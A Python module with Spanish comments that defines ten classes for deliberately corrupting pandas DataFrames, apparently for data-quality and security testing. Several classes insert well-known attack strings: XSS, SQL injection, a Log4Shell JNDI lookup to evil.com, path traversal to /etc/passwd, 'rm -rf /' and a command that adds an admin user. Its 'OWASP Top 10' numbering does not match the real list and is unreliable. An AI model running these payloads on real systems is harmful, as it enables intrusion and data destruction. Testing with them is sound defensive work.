# src/modules/data_infection/attack_types.py
"""
Tipos de Ataques Basados en OWASP Top 10 para Data Security

Cada ataque representa una vulnerabilidad común en datos:
1. Data Poisoning - Valores maliciosos que corrompen análisis
2. Schema Manipulation - Cambios de tipos de datos
3. Injection Attacks - SQL/NoSQL/Command injection
4. Missing Data - Valores nulos estratégicos
5. Outliers - Valores extremos que sesgan estadísticas
6. Duplicates - Registros duplicados
7. Data Leakage - Exposición de información sensible
8. Inconsistency - Inconsistencias en formato/valores
9. Format Corruption - Corrupción de formatos
10. Timing Attacks - Manipulación de timestamps
"""

import pandas as pd
import numpy as np
from typing import List, Dict, Any, Optional
from abc import ABC, abstractmethod
import logging

logger = logging.getLogger(__name__)


class BaseAttack(ABC):
    """Clase base para todos los ataques"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.attack_type = self.__class__.__name__
        
    @abstractmethod
    def apply(self, df: pd.DataFrame, columns: List[str], rate: float) -> pd.DataFrame:
        """
        Aplicar ataque al DataFrame
        
        Args:
            df: DataFrame a infectar
            columns: Columnas objetivo
            rate: Porcentaje de filas a afectar (0.0-1.0)
        """
        pass


class DataPoisoningAttack(BaseAttack):
    """
    OWASP #1: Data Poisoning
    Inyecta valores maliciosos que sesgan resultados
    """
    
    def apply(self, df: pd.DataFrame, columns: List[str], rate: float) -> pd.DataFrame:
        df = df.copy()
        num_rows = int(len(df) * rate)
        affected_indices = np.random.choice(df.index, num_rows, replace=False)
        
        for col in columns:
            if col not in df.columns:
                continue
                
            if df[col].dtype in ['int64', 'float64']:
                # Valores extremos que sesgan estadísticas
                mean_val = df[col].mean()
                std_val = df[col].std()
                poisoned_values = mean_val + (std_val * np.random.choice([10, -10, 100, -100], num_rows))
                df.loc[affected_indices, col] = poisoned_values
            else:
                # Strings maliciosos
                malicious_strings = [
                    '<script>alert("XSS")</script>',
                    "'; DROP TABLE users; --",
                    '../../../etc/passwd',
                    '${jndi:ldap://evil.com/a}',
                    '"><img src=x onerror=alert(1)>'
                ]
                df.loc[affected_indices, col] = np.random.choice(malicious_strings, num_rows)
        
        logger.info(f"DataPoisoning: Affected {num_rows} rows in columns {columns}")
        return df


class SchemaManipulationAttack(BaseAttack):
    """
    OWASP #2: Schema Manipulation
    Cambia tipos de datos inesperadamente
    """
    
    def apply(self, df: pd.DataFrame, columns: List[str], rate: float) -> pd.DataFrame:
        df = df.copy()
        num_rows = int(len(df) * rate)
        affected_indices = np.random.choice(df.index, num_rows, replace=False)
        
        for col in columns:
            if col not in df.columns:
                continue
                
            if df[col].dtype in ['int64', 'float64']:
                # Insertar strings en columnas numéricas
                df.loc[affected_indices, col] = 'INVALID_NUMBER'
            elif df[col].dtype == 'object':
                # Insertar números en columnas de texto
                df.loc[affected_indices, col] = 99999
        
        logger.info(f"SchemaManipulation: Affected {num_rows} rows in columns {columns}")
        return df


class InjectionAttack(BaseAttack):
    """
    OWASP #3: Injection Attacks
    Inyecta payloads de SQL, NoSQL, Command Injection
    """
    
    def apply(self, df: pd.DataFrame, columns: List[str], rate: float) -> pd.DataFrame:
        df = df.copy()
        num_rows = int(len(df) * rate)
        affected_indices = np.random.choice(df.index, num_rows, replace=False)
        
        injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE customers; --",
            "admin'--",
            "1' UNION SELECT NULL, username, password FROM users--",
            "$ne: null",
            "{ $gt: '' }",
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& net user admin pass123 /add"
        ]
        
        for col in columns:
            if col not in df.columns:
                continue
            df.loc[affected_indices, col] = np.random.choice(injection_payloads, num_rows)
        
        logger.info(f"Injection: Affected {num_rows} rows in columns {columns}")
        return df


class MissingDataAttack(BaseAttack):
    """
    OWASP #4: Missing/Null Values
    Elimina valores estratégicamente
    """
    
    def apply(self, df: pd.DataFrame, columns: List[str], rate: float) -> pd.DataFrame:
        df = df.copy()
        num_rows = int(len(df) * rate)
        affected_indices = np.random.choice(df.index, num_rows, replace=False)
        
        for col in columns:
            if col not in df.columns:
                continue
            df.loc[affected_indices, col] = None
        
        logger.info(f"MissingData: Affected {num_rows} rows in columns {columns}")
        return df


class OutlierAttack(BaseAttack):
    """
    OWASP #5: Outliers Extremos
    Valores que sesgan estadísticas
    """
    
    def apply(self, df: pd.DataFrame, columns: List[str], rate: float) -> pd.DataFrame:
        df = df.copy()
        num_rows = int(len(df) * rate)
        affected_indices = np.random.choice(df.index, num_rows, replace=False)
        
        for col in columns:
            if col not in df.columns or df[col].dtype not in ['int64', 'float64']:
                continue
                
            max_val = df[col].max()
            # Outliers 100x más grandes
            outliers = max_val * np.random.uniform(100, 1000, num_rows)
            df.loc[affected_indices, col] = outliers
        
        logger.info(f"Outlier: Affected {num_rows} rows in columns {columns}")
        return df


class DuplicateAttack(BaseAttack):
    """
    OWASP #6: Registros Duplicados
    Duplica filas para inflar conteos
    """
    
    def apply(self, df: pd.DataFrame, columns: List[str], rate: float) -> pd.DataFrame:
        num_rows = int(len(df) * rate)
        indices_to_duplicate = np.random.choice(df.index, num_rows, replace=False)
        duplicates = df.loc[indices_to_duplicate].copy()
        df = pd.concat([df, duplicates], ignore_index=True)
        
        logger.info(f"Duplicate: Added {num_rows} duplicate rows")
        return df


class DataLeakageAttack(BaseAttack):
    """
    OWASP #7: Data Leakage
    Expone información sensible
    """
    
    def apply(self, df: pd.DataFrame, columns: List[str], rate: float) -> pd.DataFrame:
        df = df.copy()
        num_rows = int(len(df) * rate)
        affected_indices = np.random.choice(df.index, num_rows, replace=False)
        
        sensitive_data = [
            "SSN: 123-45-6789",
            "Password: admin123",
            "API_KEY: sk_live_51H...",
            "Credit Card: 4532-1234-5678-9010",
            "Secret Token: ghp_xxxxxxxxxxxx"
        ]
        
        for col in columns:
            if col not in df.columns:
                continue
            df.loc[affected_indices, col] = np.random.choice(sensitive_data, num_rows)
        
        logger.info(f"DataLeakage: Affected {num_rows} rows in columns {columns}")
        return df


class InconsistencyAttack(BaseAttack):
    """
    OWASP #8: Inconsistencias
    Valores inconsistentes en formato/unidades
    """
    
    def apply(self, df: pd.DataFrame, columns: List[str], rate: float) -> pd.DataFrame:
        df = df.copy()
        num_rows = int(len(df) * rate)
        affected_indices = np.random.choice(df.index, num_rows, replace=False)
        
        for col in columns:
            if col not in df.columns:
                continue
                
            if 'date' in col.lower() or 'time' in col.lower():
                # Formatos de fecha inconsistentes
                formats = ['2024-01-01', '01/01/2024', '1-Jan-24', '20240101']
                df.loc[affected_indices, col] = np.random.choice(formats, num_rows)
            elif 'email' in col.lower():
                # Emails mal formados
                invalid_emails = ['notanemail', 'test@', '@domain.com', 'test..test@test.com']
                df.loc[affected_indices, col] = np.random.choice(invalid_emails, num_rows)
        
        logger.info(f"Inconsistency: Affected {num_rows} rows in columns {columns}")
        return df


class FormatCorruptionAttack(BaseAttack):
    """
    OWASP #9: Format Corruption
    Corrompe formato de datos
    """
    
    def apply(self, df: pd.DataFrame, columns: List[str], rate: float) -> pd.DataFrame:
        df = df.copy()
        num_rows = int(len(df) * rate)
        affected_indices = np.random.choice(df.index, num_rows, replace=False)
        
        corrupted_values = [
            '\x00\x00\x00',  # Null bytes
            '�����',  # Encoding issues
            '\n\n\n\n',  # Newlines
            '\t\t\t',  # Tabs
            '     ',  # Solo espacios
            ''  # String vacío
        ]
        
        for col in columns:
            if col not in df.columns:
                continue
            df.loc[affected_indices, col] = np.random.choice(corrupted_values, num_rows)
        
        logger.info(f"FormatCorruption: Affected {num_rows} rows in columns {columns}")
        return df


class TimingAttack(BaseAttack):
    """
    OWASP #10: Timing Attacks
    Manipula timestamps para ocultar patrones
    """
    
    def apply(self, df: pd.DataFrame, columns: List[str], rate: float) -> pd.DataFrame:
        df = df.copy()
        num_rows = int(len(df) * rate)
        affected_indices = np.random.choice(df.index, num_rows, replace=False)
        
        for col in columns:
            if col not in df.columns:
                continue
                
            if 'date' in col.lower() or 'time' in col.lower():
                # Timestamps en el futuro/pasado lejano
                df.loc[affected_indices, col] = pd.to_datetime('2099-12-31')
            else:
                # Reordenar valores aleatoriamente
                shuffled = df[col].sample(frac=1).values
                df.loc[affected_indices, col] = shuffled[:num_rows]
        
        logger.info(f"Timing: Affected {num_rows} rows in columns {columns}")
        return df


# Mapeo de nombres a clases
ATTACK_REGISTRY = {
    'data_poisoning': DataPoisoningAttack,
    'schema_manipulation': SchemaManipulationAttack,
    'injection': InjectionAttack,
    'missing_data': MissingDataAttack,
    'outliers': OutlierAttack,
    'duplicates': DuplicateAttack,
    'data_leakage': DataLeakageAttack,
    'inconsistency': InconsistencyAttack,
    'format_corruption': FormatCorruptionAttack,
    'timing': TimingAttack
}
